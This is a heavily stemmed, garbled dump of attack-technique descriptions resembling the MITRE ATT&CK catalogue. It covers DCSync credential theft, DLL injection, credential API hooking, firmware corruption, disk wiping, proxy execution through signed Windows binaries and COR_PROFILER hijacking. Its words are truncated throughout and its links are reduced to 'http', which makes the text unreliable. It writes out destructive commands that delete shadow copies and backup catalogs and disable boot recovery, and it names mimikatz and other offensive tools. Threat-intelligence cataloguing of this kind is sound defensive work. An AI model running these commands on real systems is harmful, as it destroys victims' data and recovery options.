advers attempt access cred sensit inform abus window domain control apply program interfac ap microsoft drsr dec 2017 microsoft getnccchang samb drsuapi win ap samlib.dll sim reply process remot domain control us techn cal dcsync memb admin domain admin enterpr admin group comput account domain control abl run dcsync pul password dat adsec mimikatz dcsync act direct includ cur hist hash pot us account krbtgt admin hash turn us cre gold ticket http us pas ticket http harmj0y mimikatz dcsync chang account password not account manip http insiderthr changentlm july 2017 dcsync funct includ lsadump mod mimikatz http github mimikatz lsadump mod lsadump also includ netsynt perform dcsync leg reply protocol microsoft nrpc dec 2017
system tim discovery
advers gath system tim and/or tim zon loc remot system system tim set stor window tim serv within domain maintain tim synchron system serv enterpr network msdn system tim technet window tim serv system tim inform gath numb way net http window perform < cod > net tim \\hostname < /code > gath system tim remot system victim tim zon also inf cur system tim gath us < cod > w32tm /tz < /code > technet window tim serv inform could us perform techn execut fil schedule task/job http rsa eu12 're insid discov loc inform bas tim zon assist victim target i.e system loc discovery http advers also us knowledg system tim part tim bomb delay execut spec date/tim anyrun timebomb

advers abus http util perform task schedule init rec execut malicy cod http util ex execut within window linux maco schedule task spec tim dat although deprec fav schedule task http schtasks http window environ us http requir task scheduler serv run us log memb loc admin group linux maco http invok superus wel us ad < cod > at.allow < /code > fil < cod > at.allow < /code > fil ex < cod > at.deny < /code > fil check every usernam list < cod > at.deny < /code > allow invok http < cod > at.deny < /code > ex empty glob us http permit neith fil ex oft baselin superus allow us http linux advers us http execut program system startup schedule bas persist http http also abus conduc remot execut http part lat mov http and/or run process context spec account system linux environ advers also abus http break restrict environ us task spawn interact system shel run system command simil http also us privileg esc http bin allow run superus via < cod > sudo < /code > gtfobins
serv execut
advers execut bin command script via method interact window serv serv control man do eith cre new serv mod ex serv techn execut us conjunct new serv http mod ex serv http serv persist privileg esc
dynamic-link libr inject
advers inject dynamic-link libr dlls process ord evad process-based defens wel poss elev privileg dll inject method execut arbit cod address spac sep liv process dll inject common perform writ path dll virt address spac target process load dll invok new thread writ perform nat window ap cal < cod > virtualallocex < /code > < cod > writeprocessmem < /code > invok < cod > createremotethread < /code > cal < cod > loadlibr < /code > ap respons load dll elast process inject july 2017 vary method reflect dll inject writ self-mapping dll process mem mod map dll writ process overcom address reloc issu wel addit ap invok execut sint method load execut fil mem man preform funct < cod > loadlibr < /code > elast huntingnmem jun 2017 elast process inject july 2017 anoth vary method oft ref mod stomping/overload dll hollow lev cont inject cod within process method involv load legitim dll remot process man overwrit mod < cod > addressofentrypoint < /code > start new thread target process mod stomp shellcod inject vary allow attack hid malicy inject cod pot back execut legitim dll fil disk hid malicy cod mod stomp run cod context anoth process allow access process mem system/network resourc poss elev privileg execut via dll inject also evad detect sec produc sint execut mask legitim process
powershel
powershel pow interact command-line interfac script environ includ window op system technet powershel advers us powershel perform numb act includ discovery inform execut cod exampl includ start-process cmdlet us run execut invoke-command cmdlet run command loc remot comput powershel also us download run execut internet execut disk mem without touch disk admin permit requir us powershel connect remot system numb powershell-based offend test tool avail includ empir http powersploit powersploit psattack github psattack powershel commands/script also execut without direct invok powershell.exe bin interfac powershel und system.management.automation assembl expos .net framework window common langu interfac cli sixdub powerpick jan 2016 silentbreak offend p dec 2015 microsoft psfromcsharp apr 2014
exploit
advers buy ste download exploit us target exploit tak adv bug vuln ord caus unintend unanticip behavy occ comput hardw softw rath develop exploit advers find/modify exploit onlin purchas exploit vend exploit databas tempertondarkhotel nationsbuy addit download fre exploit internet advers purchas exploit third-party ent third-party ent includ technolog company spec exploit develop crimin marketplac includ exploit kit individ pegasuscitizenlab wir sandc oct 2019 addit purchas exploit advers ste repurpos exploit third-party ent includ advers tempertondarkhotel advers monit exploit provid for understand stat ex wel new discov exploit us delay exploit discov mak publ advers target system know conduc exploit research develop ord gain knowledg us subsequ op advers us exploit vary phas advers lifecyc i.e exploit public-facing apply http exploit cli execut http exploit privileg esc http exploit defens evas http exploit cred access http exploit remot serv http apply system exploit http
mod auth process
advers mod auth mech process access us cred en otherw unwar access account auth process handl mech loc sec auth serv lsass process sec account man sam window plug auth mod pam unix-based system auth plugin maco system respons gath stor valid cred mod auth process advers abl auth serv system without us valid account http advers malicy mod part process eith rev cred bypass auth mech comprom cred access us bypass access control plac vary resourc system within network ev us persist access remot system extern avail serv vpns outlook web access remot desktop
cred ap hook
advers hook window apply program interfac ap funct collect us cred malicy hook mech capt ap cal includ paramet rev us auth cred microsoft trojanspy win32/ursnif.g sept 2017 unlik keylog http techn foc spec ap funct includ paramet rev us cred hook involv redirect cal funct impl via hook proc interceiv execut design cod respons ev mess keystrok mous input microsoft hook overview elast process inject july 2017 import address tabl iat hook us mod process ’ iat point import ap funct stor elast process inject july 2017 adl softw iat hook oct 2014 mwrinfosecurity dynam hook 2015 inlin hook overwrit first byt ap funct redirect cod flow elast process inject july 2017 hightech bridg inlin hook sept 2011 mwrinfosecurity dynam hook 2015
firmw corrupt
advers overwrit corrupt flash mem cont system bio firmw dev attach system ord rend inop un boot thu deny avail us dev and/or system symantec chernobyl w95.cih firmw softw load execut non-volatile mem hardw dev ord init man dev funct dev includ motherboard hard driv video card gen advers manip overwrit corrupt firmw ord deny us system dev exampl corrupt firmw respons load op system network dev rend network dev inop dhs_threat_to_net_devices cisa_malware_orgs_ukraine depend dev attack also result dat destruct http
inhibit system recovery
advers delet remov built-in op system dat turn serv design aid recovery corrupt system prev recovery talo olymp destroy 2018 fireey wannacry 2017 deny access avail backup recovery opt op system contain feat help fix corrupt system backup catalog volum shadow cop autom repair feat advers dis delet system recovery feat aug effect dat destruct http dat encrypt impact http talo olymp destroy 2018 fireey wannacry 2017 numb nat window util us advers dis delet system recovery feat < cod > vssadmin.exe < /code > us delet volum shadow cop system - < cod > vssadmin.exe delet shadow /all /quiet < /code > window man instru http us delet volum shadow cop - < cod > wmic shadowcop delet < /code > < cod > wbadmin.exe < /code > us delet window backup catalog - < cod > wbadmin.exe delet catalog -quiet < /code > < cod > bcdedit.exe < /code > us dis autom window recovery feat mod boot config dat - < cod > bcdedit.exe /set default bootstatuspolicy ignoreallfail bcdedit /set default recovery < /code >
netsh help dll
advers est persist execut malicy cont trig netsh help dlls netsh.exe also ref netshel command-line script util us interact network config system contain funct ad help dlls extend funct util technet netsh path reg netsh.exe help dlls ent window reg < cod > hklm\software\microsoft\netsh < /code > advers us netsh.exe help dlls trig execut arbit cod persist man execut would tak plac anytim netsh.exe execut could hap autom anoth persist techn softw ex vpn pres system execut netsh.exe part norm funct github netsh help c beacon demask netsh persist
spearph via serv
advers send spearph mess via third-party serv attempt gain access victim system spearph via serv spec vary spearph diff form spearph employ us third party serv rath direct via enterpr email channel form spearph electron del soc engin target spec individ company industry scenario advers send mess vary soc med serv person webmail non-enterprise control serv serv lik less-strict sec policy enterpr kind spearph goal gen rapport target get target interest way advers cre fak soc med account mess employ pot job opportun allow plaus reason ask serv policy softw run environ advers send malicy link attach serv common exampl build rapport target via soc med send cont person webmail serv target us work comput allow advers bypass email restrict work account target lik op fil sint someth expect payload n't work expect advers continu norm commun troubleshoot target get work
intern proxy
advers us intern proxy direct command control traff two system comprom environ many tool ex en traff redirect proxy port redirect includ htran http zxproxy zxportmap trend micro apt attack tool advers us intern proxy man command control commun insid comprom environ reduc numb simult outbound network connect provid resy fac connect loss rid ex trust commun path infect system avoid susp intern proxy connect us common peer-to-pe p2p network protocol smb bet blend environ us comprom intern system proxy advers cont tru destin c2 traff reduc nee num connect extern system
system script proxy execut
advers us trust script oft sign cert proxy execut malicy fil sev microsoft sign script download microsoft default window instal us proxy execut fil lolba project behavy abus advers execut malicy fil could bypass apply control sign valid system github ultim applock bypass list
custom command control protocol
advers commun us custom command control protocol instead encaps commands/data ex apply lay protocol http impl includ mim well-known protocol develop custom protocol includ raw socket top funda protocol provid tcp/ip/another standard network stack
dead drop resolv
advers us ex legitim extern web serv host inform point addit command control c2 infrastruct advers post cont know dead drop resolv web serv emb oft obfuscated/encod domain ip address infect victim reach redirect resolv popul websit soc med act mech c2 giv sign amount cov due lik host within network already commun pri comprom us common serv off googl twit mak easy advers hid expect nois web serv provid common us ssl/tls encrypt giv advers ad level protect us dead drop resolv also protect back-end c2 infrastruct discovery malw bin analys also en op resy sint infrastruct dynam chang
installutil
installutil command-line util allow instal uninstal resourc execut spec instal compon spec .net bin msdn installutil installutil loc .net direct window system < cod > c \windows\microsoft.net\framework\v < vert > \installutil.exe < /code > < cod > c \windows\microsoft.net\framework64\v < vert > \installutil.exe < /code > installutil.exe digit sign microsoft advers us installutil proxy execut cod trust window util installutil also us bypass process whitel us attribut within bin execut class dec attribut < cod > system.componentmodel.runinstaller tru < /code > lolba installutil
junk dat
advers ad junk dat protocol us command control mak detect difficult ad random meaningless dat protocol us command control advers prev triv method decod deciph otherw analys traff exampl includ appending/prepend dat junk charact writ junk charact sign charact
spearph serv
advers send spearph mess via third-party serv elicit sensit inform us target spearph inform attempt trick target divulg inform frequ cred act inform spearph inform frequ involv soc engin techn pos sourc reason collect inform ex est account http comprom account http and/or send multipl seem urg mess form spearph electron del soc engin target spec individ company industry scenario advers send mess vary soc med serv person webmail non-enterprise control serv threatpost soc med phish serv lik less-strict sec policy enterpr kind spearph goal gen rapport target get target interest way advers cre fak soc med account mess employ pot job opportun allow plaus reason ask serv policy inform environ advers also us inform prevy reconnaiss effort ex soc med http search victim-owned websit http craft persuas believ lur
common us port
techn deprec pleas us non-standard port http appropry advers commun common us port bypass firewal network detect system blend norm network act avoid detail inspect us common op port tcp:80 http tcp:443 http tcp:25 smtp tcp/udp:53 dns us protocol assocy port complet diff protocol connect occ intern within enclav proxy pivot nod nod exampl common port tcp/udp:135 rpc tcp/udp:22 ssh tcp/udp:3389 rdp
contain ap
advers gath cred via ap within contain environ ap environ dock ap kubernet ap allow us remot man contain resourc clust compon dock ap kubernet ap advers access dock ap collect log contain cred cloud contain vary resourc environ unit 42 unsec dock daemon advers sufficy permit via pod serv account also us kubernet ap retriev cred kubernet ap serv cred includ nee dock ap auth secret kubernet clust compon
domain
advers hijack domain and/or subdomain us target domain reg hijack act chang reg domain nam without permit origin reg icanndomainnamehijack advers gain access email account person list own domain advers claim forget password ord mak chang domain reg poss includ soc engin domain reg help desk gain access account tak adv renew process gap kreb dns hijack 2019 subdomain hijack occ org dns entry point non-existent deprovid resourc cas advers tak control subdomain conduc op benefit trust assocy domain microsoft sub takeov 2020
sql stor proc
advers abus sql stor proc est persist access system sql stor proc cod sav reus databas us wast tim rewrit frequ us sql query stor proc invok via sql stat databas us proc nam via defin ev e.g sql serv apply started/restart advers craft malicy stor proc provid persist mech sql databas serv netsp startup stor proc kaspersky mssql aug 2019 execut op system command sql syntax advers en addit funct xp_cmdshell mssql serv netsp startup stor proc kaspersky mssql aug 2019 microsoft xp_cmdshell 2017 microsoft sql serv en common langu runtim clr integr clr integr en apply develop writ stor proc us .net framework langu e.g vb .net c etc. microsoft clr integr 2017 advers craft mod clr assembl link stor proc sint clr assembl mak execut arbit command netsp sql serv clr
network dev auth
advers us patch system im http hard cod password op system thu bypass nat auth mech loc account network dev mod system im http includ impl cod op system network dev provid access advers us spec password mod includ spec password impl op system im via patch upon auth attempt insert cod first check see us input password access grant otherw impl cod pas cred ver pot valid cred mandy - syn knock
disk cont wip
advers eras cont stor dev spec system larg numb network interrupt avail system network resourc advers part complet overwrit cont stor dev rend dat irrecov stor interfac novett blockbust novett blockbust destruct malw doj lazar sony 2018 instead wip spec disk structure fil advers destruct int wip arbit port disk cont wip disk cont advers acquir direct access hard driv ord overwrit arbit siz port disk random dat novett blockbust destruct malw advers observ lev third-party driv lik rawdisk http direct access disk cont novett blockbust novett blockbust destruct malw behavy distinct dat destruct http sect disk eras instead individ fil maxim impact target org op network-wide avail interrupt goal malw us wip disk cont worm-like feat prop across network lev addit techn lik valid account http o cred dump http smb/windows admin shar http novett blockbust destruct malw
exfilt unencrypt non-c2 protocol
advers ste dat exfilt un-encrypted network protocol ex command control channel dat also send altern network loc main command control serv advers opt obfusc dat without us encrypt within network protocol nat unencrypt http ftp dns includ custom publ avail encoding/compression algorithm base64 wel emb dat within protocol head field
dylib hijack
advers execut payload plac malicy dynam libr dylib expect nam path victim apply search runtim dynam load try find dylib bas sequ ord search path path dylib prefix < cod > rpa < /code > allow develop us rel path spec array search path us runtim bas loc execut addit weak link us < cod > lc_load_weak_dylib < /code > funct apply stil execut ev expect dylib pres weak link en develop run apply multipl maco vert new ap ad advers gain execut insert malicy dylib nam miss dylib ident path wardl dylib hijack vuln ap wardl dylib hijack osx 2015 github empireproject hijackscan github empireproject createhijack dylib dylib load apply address spac allow malicy dylib inherit apply privileg level resourc bas apply could result privileg esc uninhibit network access method also evad detect sec produc sint execut mask legitim process writ bad malw osx wardl artofmalw volume1 malwareunicorn maco dylib inject macho
downgrad system im
advers instal old vert op system network dev weak sec old op system vert network dev oft weak encrypt ciph gen fewer/less upd defend feat cisco syn knock evolv emb dev downgrad vert typ requir replac op system fil stor emb dev achiev download cop desir vert op system fil reconfig dev boot fil next system restart advers could restart dev impl chang immedy could wait next tim system restart downgrad system im old vert allow advers evad defens en behavy weak encrypt http downgrad system im do us conjunct patch system im http
loc account
advers obtain abus cred loc account mean gain init access persist privileg esc defens evas loc account config org us us remot support serv admin singl system serv loc account also abus elev privileg harvest cred o cred dump http password reus allow abus loc account across set machin network purpos privileg esc lat mov
exploit defens evas
advers exploit system apply vuln bypass sec feat exploit softw vuln occ advers tak adv program er program serv within op system softw kernel execut adversary-controlled cod vuln ex defend sec softw us dis circumv advers pri knowledg reconnaiss sec softw ex within environ perform check short system comprom sec softw discovery http sec softw lik target direct exploit exampl antivir softw target persist threat group avoid detect
trust develop util proxy execut
advers tak adv trust develop util proxy execut malicy payload many util us softw develop rel task us execut cod vary form assist develop debug revers engin engima0x3 dnx bypass engima0x3 rcsi bypass exploit monday windbg lolba track util oft sign legitim cert allow execut system proxy execut malicy cod trust process effect bypass apply control solv
system shutdown/reboot
advers shutdown/reboot system interrupt access aid destruct system op system contain command in shutdown/reboot machin network dev cas command also us in shutdown/reboot remot comput network dev via network dev cli http e.g < cod > reload < /code > microsoft shutdown oct 2017 alert_ta18_106a shut reboot system disrupt access comput resourc legitim us advers attempt shutdown/reboot system impact way disk structure wip http inhibit system recovery http hast intend effect system avail talo nyety jun 2017 talo olymp destroy 2018
mmc
advers abus mmc.exe proxy execut malicy .msc fil microsoft man consol mmc bin sign microsoft us sev way eith gui command prompt win_mmc what_is_mmc mmc us cre op sav custom consol contain admin tool cre microsoft cal snap-ins snap-ins us man window system loc remot mmc also us op microsoft cre .msc fil man system config win_msc_files_overview exampl < cod > mmc c \users\foo\admintools.msc /a < /code > op custom sav consol msc fil auth mod win_mmc anoth common exampl < cod > mmc gpedit.msc < /code > op group policy edit apply window advers us mmc command perform malicy task exampl < cod > mmc wbadmin.msc delet catalog -quiet < /code > delet backup catalog system i.e inhibit system recovery http without prompt us not < cod > wbadmin.msc < /code > pres default window serv op system win_wbadmin_delete_catalog phobos_virustotal advers also abus mmc execut malicy .msc fil exampl advers first cre malicy reg class ident clsid subkey un ident compon object model http class object win_clsid_key advers cre custom consol “ link web address ” snap-in link malicy clsid subkey mmc_vulns .msc fil sav advers invok malicy clsid payload follow command < cod > mmc.exe -embedding c \path\to\test.msc < /code > abusing_com_reg
process argu spoof
advers attempt hid process command-line argu overwrit process mem process command-line argu stor process environ block peb dat structure us window stor vary inform about/used process peb includ process command-line argu ref execut process process cre defend tools/sensor monit process cre retriev process argu peb microsoft peb 2021 xpn argu lik cobalt 2019 advers manip process peb evad defens exampl process hollow http abus spawn process suspend stat benign argu process spawn peb init process inform pot log tools/sensor advers overrid peb mod command-line argu ex us nat ap http < cod > writeprocessmem < /code > funct resum process execut malicy argu cobalt strike argu 2019 xpn argu lik cobalt 2019 nviso spoof command lin 2020 advers also execut process malicy command-line argu patch mem benign argu bypass subsequ process mem analys fireey fivehand april 2021 behavy also combin trick par pid spoof http manip evad process-based detect
window admin shar
window system hid network shar access admin provid abl remot fil cop admin funct exampl network shar includ < cod > c < /code > < cod > admin < /code > < cod > ipc < /code > advers us techn conjunct administrator-level valid account http remot access network system serv mess block smb wikiped smb interact system us remot proc cal rpcs technet rpc transf fil run transf bin remot execut exampl execut techn rely auth sess smb/rpc schedule task/job http serv execut http window man instru http advers also us ntlm hash access admin shar system pas hash http certain config patch level microsoft admin shar net http util us connect window admin shar remot system us < cod > net us < /code > command valid cred technet net us
cor_profil
advers lev cor_profil environ vary hijack execut flow program load .net clr cor_profil .net framework feat allow develop spec unm extern .net profil dll load .net process load common langu runtim clr profil design monit troubleshoot debug man cod execut .net clr microsoft profil mar 2017 microsoft cor_profil feb 2013 cor_profil environ vary set vary scop system us process result diff level influ system user-wide environ vary scop spec reg compon object model http com object reg profil dll process scop cor_profil also cre in-memory without mod reg start .net framework 4 profil dll nee reg long loc dll spec cor_profiler_path environ vary microsoft cor_profil feb 2013 advers abus cor_profil est persist execut malicy dll context .net process every tim clr invok cor_profil also us elev privileg ex bypass us account control http victim .net process execut high permit level wel hook impair defens http provid .net process redc mockingbird 2020 red can cor_profil 2020 almond cor_profil apr 2019 github omery invisi-shell subt .net profil 2017
